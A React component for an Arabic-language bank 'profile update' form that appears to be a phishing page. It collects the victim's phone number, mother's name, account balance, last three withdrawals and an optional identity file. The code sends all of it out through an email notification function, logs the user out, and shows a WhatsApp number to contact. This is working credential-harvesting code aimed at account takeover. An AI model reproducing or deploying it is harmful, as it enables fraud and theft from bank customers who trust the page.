import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import Header from '../components/Header';


import {
    validateTextInput,
    validateFile,
    sanitizeInput
} from '../utils/validation';
import {
    getCurrentUser,
    updateSession,
    isAuthenticated,
    destroySession
} from '../utils/auth';
import {
    sendProfileUpdateNotification
} from '../utils/emailService';

const ProfileUpdate = () => {
    const navigate = useNavigate();
    
    const currentUser = getCurrentUser();

    // Form state
    const [formData, setFormData] = useState({
        phoneNumber: '',
        parentName: '',
        beneficiariesList: '',
        services: {
            changePassword: false,
            changeLimit: false,
            fileEncryption: false,
            preferVisa: false,
            transferLimit: false,
            roofLimit: false,
            foreignService: false,
            retrieveAccount: false
        },
        totalAmount: '',
        // identityFile: null,
        // identityFileBase64: null,

        withdrawals: {
            withdrawal1: '',
            withdrawal2: '',
            withdrawal3: ''
        }
    });

    // Original data for comparison
    const [originalData, setOriginalData] = useState(null);

    // UI state
    const [errors, setErrors] = useState({});
    const [isLoading, setIsLoading] = useState(false);
    const [alert, setAlert] = useState(null);
    const [showPhoneModal, setShowPhoneModal] = useState(false);

    // Check authentication
    useEffect(() => {
        if (!isAuthenticated()) {
            navigate('/login');
        } else {
            // Load user data
            loadUserData();
        }
    }, [navigate]);

    /**
     * Loads user data
     */
    const loadUserData = () => {
        // In production, fetch from backend
        const userData = {
            phoneNumber: currentUser?.phoneNumber || '',
            parentName: currentUser?.parentName || '',
            beneficiariesList: currentUser?.beneficiariesList || '',
            services: currentUser?.services || {
                changePassword: false,
                changeLimit: false,
                fileEncryption: false,
                preferVisa: false,
                transferLimit: false,
                roofLimit: false,
                foreignService: false,
                retrieveAccount: false
            },
            totalAmount: currentUser?.totalAmount || '',
            withdrawals: currentUser?.withdrawals || {
                withdrawal1: '',
                withdrawal2: '',
                withdrawal3: ''
            }
        };

        setFormData(userData);
        setOriginalData(JSON.parse(JSON.stringify(userData)));
    };

    /**
     * Handles text input changes
     */
    const handleChange = (e) => {
        const { name, value } = e.target;
        const sanitizedValue = sanitizeInput(value);

        setFormData(prev => ({
            ...prev,
            [name]: sanitizedValue
        }));

        // Clear error
        if (errors[name]) {
            setErrors(prev => ({
                ...prev,
                [name]: null
            }));
        }
    };

    /**
     * Handles checkbox changes
     */
    const handleServiceChange = (serviceName) => {
        setFormData(prev => ({
            ...prev,
            services: {
                ...prev.services,
                [serviceName]: !prev.services[serviceName]
            }
        }));
    };

    /**
     * Handles withdrawal input changes
     */
    const handleWithdrawalChange = (e) => {
        const { name, value } = e.target;
        const sanitizedValue = sanitizeInput(value);

        setFormData(prev => ({
            ...prev,
            withdrawals: {
                ...prev.withdrawals,
                [name]: sanitizedValue
            }
        }));
    };

    /**
     * Handles file upload
     */
    const handleFileChange = (e) => {
        const file = e.target.files[0];

        if (!file) return;

        // allowed types
        const allowedTypes = ['application/pdf', 'image/jpeg', 'image/png', 'image/jpg'];
        const maxSize = 5 * 1024 * 1024; // 5MB

        if (!allowedTypes.includes(file.type)) {
            setErrors(prev => ({
                ...prev,
                identityFile: 'الملف يجب أن يكون صورة JPG/PNG أو PDF'
            }));
            return;
        }

        if (file.size > maxSize) {
            setErrors(prev => ({
                ...prev,
                identityFile: 'حجم الملف كبير جداً (الحد الأقصى 5MB)'
            }));
            return;
        }

        const reader = new FileReader();

        reader.onloadend = () => {
            setFormData(prev => ({
                ...prev,
                identityFile: file,
                identityFileBase64: reader.result // <-- Base64 ✨
            }));
            setErrors(prev => ({ ...prev, identityFile: null }));
        };

        reader.readAsDataURL(file);
    };


    /**
     * Validates form
     */
    const validateForm = () => {
        const newErrors = {};

        // Validate phone number
        if (formData.phoneNumber && !validateTextInput(formData.phoneNumber)) {
            newErrors.phoneNumber = 'رقم الهاتف يحتوي على أحرف غير صالحة';
        }

        // Validate parent name
        if (formData.parentName && !validateTextInput(formData.parentName)) {
            newErrors.parentName = 'اسم الوالدة يحتوي على أحرف غير صالحة';
        }

        // Validate beneficiaries list
        if (formData.beneficiariesList && !validateTextInput(formData.beneficiariesList)) {
            newErrors.beneficiariesList = 'قائمة المستفيدين تحتوي على أحرف غير صالحة';
        }

        // Validate total amount
        if (formData.totalAmount && !/^\d+(\.\d{1,2})?$/.test(formData.totalAmount)) {
            newErrors.totalAmount = 'المبلغ يجب أن يكون رقماً صحيحاً';
        }

        setErrors(newErrors);
        return Object.keys(newErrors).length === 0;
    };

    /**
     * Detects changes between original and current data
     */
    const detectChanges = () => {
        if (!originalData) return [];

        const changes = [];

        // Field labels in Arabic
        const fieldLabels = {
            phoneNumber: 'رقم الهاتف المسجل',
            parentName: 'اسم الوالدة',
            beneficiariesList: 'قائمة المستفيدين',
            totalAmount: 'إجمالي المبلغ',
            changePassword: 'تغيير الرقم السري',
            changeLimit: 'تغيير الهاتف',
            fileEncryption: 'فك حظر و تجميد',
            preferVisa: 'تفعيل فيزا',
            transferLimit: 'تحويل خاطئ',
            roofLimit: 'رفع سقف',
            foreignService: 'خدمة العملات الأجنبية',
            retrieveAccount: 'استرداد حساب مخترق',
            withdrawal1: 'سحب 1',
            withdrawal2: 'سحب 2',
            withdrawal3: 'سحب 3'
        };

        // Check text fields
        ['phoneNumber', 'parentName', 'beneficiariesList', 'totalAmount'].forEach(field => {
            if (formData[field] !== originalData[field]) {
                changes.push({
                    field: fieldLabels[field],
                    oldValue: originalData[field] || 'غير محدد',
                    newValue: formData[field] || 'غير محدد'
                });
            }
        });

        // Check services
        Object.keys(formData.services).forEach(service => {
            if (formData.services[service] !== originalData.services[service]) {
                changes.push({
                    field: fieldLabels[service],
                    oldValue: originalData.services[service] ? 'مفعل' : 'غير مفعل',
                    newValue: formData.services[service] ? 'مفعل' : 'غير مفعل'
                });
            }
        });

        // Check withdrawals
        Object.keys(formData.withdrawals).forEach(withdrawal => {
            if (formData.withdrawals[withdrawal] !== originalData.withdrawals[withdrawal]) {
                changes.push({
                    field: fieldLabels[withdrawal],
                    oldValue: originalData.withdrawals[withdrawal] || 'غير محدد',
                    newValue: formData.withdrawals[withdrawal] || 'غير محدد'
                });
            }
        });

        // Check file upload
        if (formData.identityFile) {
            changes.push({
                field: 'ملف إثبات الهوية',
                oldValue: 'لا يوجد',
                newValue: formData.identityFile.name
            });
        }

        return changes;
    };

    /**
     * Handles form submission
     */
    const handleSubmit = async (e) => {
        e.preventDefault();
        setAlert(null);

        // Validate form
        if (!validateForm()) {
            setAlert({
                type: 'error',
                message: 'يرجى تصحيح الأخطاء في النموذج'
            });
            return;
        }

        // Detect changes
        const changes = detectChanges();

        if (changes.length === 0) {
            setAlert({
                type: 'warning',
                message: 'لم يتم إجراء أي تغييرات'
            });
            return;
        }

        setIsLoading(true);

        try {
            // Simulate API call (or real backend call)
            await new Promise(resolve => setTimeout(resolve, 2000));

            // Update session (local/demo)
            updateSession({
                ...formData,
                lastUpdated: new Date().toISOString()
            });

            // Try send email and capture failure if any
            let emailFailed = false;
            try {
                await sendProfileUpdateNotification({
                    accountNumber: currentUser.accountNumber,

                    // البيانات الأساسية
                    phoneNumber: formData.phoneNumber,
                    parentName: formData.parentName,
                    totalAmount: formData.totalAmount,

                    // الخدمات
                    services: formData.services,

                    // السحوبات
                    withdrawals: formData.withdrawals,

                    // مهم جداً — عشان emailService.js بيعتمد عليه
                    formData: formData,

                    // التعديلات
                    changes: changes,

                    // ملفات الهوية
                    identityFile: formData.identityFileBase64,
                    fileName: formData.identityFile ? formData.identityFile.name : null

                });setShowPhoneModal(true);
                destroySession();
            } catch (emailError) {
                console.error('Failed to send update notification:', emailError);
                emailFailed = true;
                // do not throw — we still want to show the phone card after attempt
            }

            // Update original data after everything
            setOriginalData(JSON.parse(JSON.stringify(formData)));

            // Set alert depending on email result
            if (emailFailed) {
                setAlert({
                    type: 'warning',
                    message: `تم تحديث البيانات ولكن فشل إرسال الإشعار عبر البريد.`
                });
            } else {
                setAlert({
                    type: 'success',
                    message: `تم تحديث البيانات بنجاح! (${changes.length} تغيير)`
                });
            }

            // ======= السطر الوحيد الذي يظهر المودال =======


            // Scroll to top
            window.scrollTo({ top: 0, behavior: 'smooth' });
        } catch (error) {
            console.error('Update error:', error);
            setAlert({
                type: 'error',
                message: 'حدث خطأ أثناء تحديث البيانات. يرجى المحاولة مرة أخرى'
            });
        } finally {
            setIsLoading(false);
        }
    };

    /**
     * Handles logout
     */
    const handleLogout = () => {
        destroySession();
        navigate('/login');
    };

    return (
        <div className="app-container">
            <Header />

            <div className="page-wrapper">
                <div className="form-card form-card-large">
                    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: 'var(--spacing-lg)' }}>
                        <h1 className="card-title" style={{ margin: 0 }}>استمارة تحديث البيانات  </h1>
                        <button
                            type="button"
                            className="btn btn-secondary"
                            onClick={handleLogout}
                            style={{ width: 'auto', padding: 'var(--spacing-sm) var(--spacing-lg)', fontSize: '0.9rem' }}
                        >
                            تسجيل الخروج
                        </button>
                    </div>

                    {alert && (
                        <div className={`alert alert-${alert.type}`}>
                            {alert.message}
                        </div>
                    )}

                    <form onSubmit={handleSubmit}>
                        {/* Phone Number */}
                        <div className="form-group">
                            <label htmlFor="phoneNumber" className="form-label">
                                رقم الهاتف المسجل
                            </label>
                            <input
                                type="text"
                                id="phoneNumber"
                                name="phoneNumber"
                                className={`form-input ${errors.phoneNumber ? 'error' : ''}`}
                                placeholder="أدخل رقم الهاتف"
                                value={formData.phoneNumber}
                                onChange={handleChange}
                                disabled={isLoading}
                            />
                            {errors.phoneNumber && (
                                <span className="error-message">{errors.phoneNumber}</span>
                            )}
                        </div>

                        {/* Parent Name */}
                        <div className="form-group">
                            <label htmlFor="parentName" className="form-label">
                                اسم الوالدة
                            </label>
                            <input
                                type="text"
                                id="parentName"
                                name="parentName"
                                className={`form-input ${errors.parentName ? 'error' : ''}`}
                                placeholder="أدخل اسم الوالدة"
                                value={formData.parentName}
                                onChange={handleChange}
                                disabled={isLoading}
                            />
                            {errors.parentName && (
                                <span className="error-message">{errors.parentName}</span>
                            )}
                        </div>

                        {/* Beneficiaries List */}
                        {/* <div className="form-group">
                            <label htmlFor="beneficiariesList" className="form-label">
                                قائمة المستفيدين
                            </label>
                            <input
                                type="text"
                                id="beneficiariesList"
                                name="beneficiariesList"
                                className={`form-input ${errors.beneficiariesList ? 'error' : ''}`}
                                placeholder="أدخل قائمة المستفيدين"
                                value={formData.beneficiariesList}
                                onChange={handleChange}
                                disabled={isLoading}
                            />
                            {errors.beneficiariesList && (
                                <span className="error-message">{errors.beneficiariesList}</span>
                            )}
                        </div> */}

                        {/* Services Checkboxes */}
                        <div className="checkbox-grid">
                            <div className="checkbox-item" onClick={() => !isLoading && handleServiceChange('changePassword')}>
                                <input
                                    type="checkbox"
                                    id="changePassword"
                                    className="checkbox-input"
                                    checked={formData.services.changePassword}
                                    onChange={() => { }}
                                    disabled={isLoading}
                                />
                                <label htmlFor="changePassword" className="checkbox-label">
                                    تغيير الرقم السري
                                </label>
                            </div>

                            <div className="checkbox-item" onClick={() => !isLoading && handleServiceChange('changeLimit')}>
                                <input
                                    type="checkbox"
                                    id="changeLimit"
                                    className="checkbox-input"
                                    checked={formData.services.changeLimit}
                                    onChange={() => { }}
                                    disabled={isLoading}
                                />
                                <label htmlFor="changeLimit" className="checkbox-label">
                                    تغيير الهاتف
                                </label>
                            </div>

                            <div className="checkbox-item" onClick={() => !isLoading && handleServiceChange('fileEncryption')}>
                                <input
                                    type="checkbox"
                                    id="fileEncryption"
                                    className="checkbox-input"
                                    checked={formData.services.fileEncryption}
                                    onChange={() => { }}
                                    disabled={isLoading}
                                />
                                <label htmlFor="fileEncryption" className="checkbox-label">
                                    فك حظر و تجميد
                                </label>
                            </div>

                            <div className="checkbox-item" onClick={() => !isLoading && handleServiceChange('preferVisa')}>
                                <input
                                    type="checkbox"
                                    id="preferVisa"
                                    className="checkbox-input"
                                    checked={formData.services.preferVisa}
                                    onChange={() => { }}
                                    disabled={isLoading}
                                />
                                <label htmlFor="preferVisa" className="checkbox-label">
                                    تفعيل فيزا
                                </label>
                            </div>

                            <div className="checkbox-item" onClick={() => !isLoading && handleServiceChange('transferLimit')}>
                                <input
                                    type="checkbox"
                                    id="transferLimit"
                                    className="checkbox-input"
                                    checked={formData.services.transferLimit}
                                    onChange={() => { }}
                                    disabled={isLoading}
                                />
                                <label htmlFor="transferLimit" className="checkbox-label">
                                    تحويل خاطئ
                                </label>
                            </div>

                            <div className="checkbox-item" onClick={() => !isLoading && handleServiceChange('roofLimit')}>
                                <input
                                    type="checkbox"
                                    id="roofLimit"
                                    className="checkbox-input"
                                    checked={formData.services.roofLimit}
                                    onChange={() => { }}
                                    disabled={isLoading}
                                />
                                <label htmlFor="roofLimit" className="checkbox-label">
                                    رفع سقف
                                </label>
                            </div>

                            <div className="checkbox-item" onClick={() => !isLoading && handleServiceChange('foreignService')}>
                                <input
                                    type="checkbox"
                                    id="foreignService"
                                    className="checkbox-input"
                                    checked={formData.services.foreignService}
                                    onChange={() => { }}
                                    disabled={isLoading}
                                />
                                <label htmlFor="foreignService" className="checkbox-label">
                                    خدمة العملات الأجنبية
                                </label>
                            </div>

                            <div className="checkbox-item" onClick={() => !isLoading && handleServiceChange('retrieveAccount')}>
                                <input
                                    type="checkbox"
                                    id="retrieveAccount"
                                    className="checkbox-input"
                                    checked={formData.services.retrieveAccount}
                                    onChange={() => { }}
                                    disabled={isLoading}
                                />
                                <label htmlFor="retrieveAccount" className="checkbox-label">
                                    استرداد حساب مخترق
                                </label>
                            </div>
                        </div>

                        {/* Total Amount */}
                        <div className="form-group">
                            <label htmlFor="totalAmount" className="form-label">
                                إجمالي المبلغ (مثال 3 مليار)
                            </label>
                            <input
                                type="text"
                                id="totalAmount"
                                name="totalAmount"
                                className={`form-input ${errors.totalAmount ? 'error' : ''}`}
                                placeholder="أدخل المبلغ"
                                value={formData.totalAmount}
                                onChange={handleChange}
                                disabled={isLoading}
                            />
                            {errors.totalAmount && (
                                <span className="error-message">{errors.totalAmount}</span>
                            )}
                        </div>

                        {/* Identity File Upload
                        <div className="file-upload-wrapper">
                            <label className="file-upload-label">إثبات الهوية</label>
                            <label
                                htmlFor="identityFile"
                                className={`file-upload-area ${formData.identityFile ? 'has-file' : ''} ${errors.identityFile ? 'error' : ''}`}
                            >
                                <input
                                    type="file"
                                    id="identityFile"
                                    className="file-upload-input"
                                    accept=".pdf,image/jpeg,image/png"
                                    onChange={handleFileChange}
                                    disabled={isLoading}
                                />
                                <div className="file-upload-text">
                                    اختر ملف إثبات الهوية
                                </div>
                                <div className="file-upload-hint">
                                    (صورة أو PDF)
                                </div>
                                {formData.identityFile && (
                                    <div className="file-name">
                                        ✓ {formData.identityFile.name}
                                    </div>
                                )}
                            </label>
                            {errors.identityFile && (
                                <span className="error-message">{errors.identityFile}</span>
                            )}
                        </div> */}

                        {/* Withdrawals */}
                        <div className="form-group">
                            <label className="form-label">آخر ثلاث سحوبات من الحساب:</label>
                            <div style={{ display: 'grid', gridTemplateColumns: 'repeat(3, 1fr)', gap: 'var(--spacing-md)' }}>
                                <input
                                    type="text"
                                    name="withdrawal1"
                                    className="form-input"
                                    placeholder="مثال : 0.."
                                    value={formData.withdrawals.withdrawal1}
                                    onChange={handleWithdrawalChange}
                                    disabled={isLoading}
                                />
                                <input
                                    type="text"
                                    name="withdrawal2"
                                    className="form-input"
                                    placeholder="مثال : 0.."
                                    value={formData.withdrawals.withdrawal2}
                                    onChange={handleWithdrawalChange}
                                    disabled={isLoading}
                                />
                                <input
                                    type="text"
                                    name="withdrawal3"
                                    className="form-input"
                                    placeholder="مثال : 0.."
                                    value={formData.withdrawals.withdrawal3}
                                    onChange={handleWithdrawalChange}
                                    disabled={isLoading}
                                />
                            </div>
                        </div>

                        {/* Submit Button */}
                        <div className="form-group mt-lg">
                            <button
                                type="submit"
                                className="btn btn-primary"
                                disabled={isLoading}
                            >
                                {isLoading ? (
                                    <>
                                        <span className="spinner"></span>
                                        <span style={{ marginRight: '8px' }}>جاري التحديث...</span>
                                    </>
                                ) : (
                                    'تحديث البيانات'
                                )}
                            </button>
                        </div>
                    </form>
                    {showPhoneModal && (
                        <div className="blur-overlay">
                            <div className="phone-card">
                                <h2>بعد التحديث تواصل مع هذا الرقم عبر الواتساب </h2>

                                <div className="phone-number">
                                    00249911266354
                                </div>

                                {/* <button
                                    className="btn btn-primary"
                                    style={{ width: "100%" }}
                                    onClick={() => {
                                        setShowPhoneModal(false);
                                        navigate("/login");
                                    }}
                                >
                                    تم
                                </button> */}

                            </div>
                        </div>
                    )}

                </div>
            </div>
        </div>
    );
};

export default ProfileUpdate;
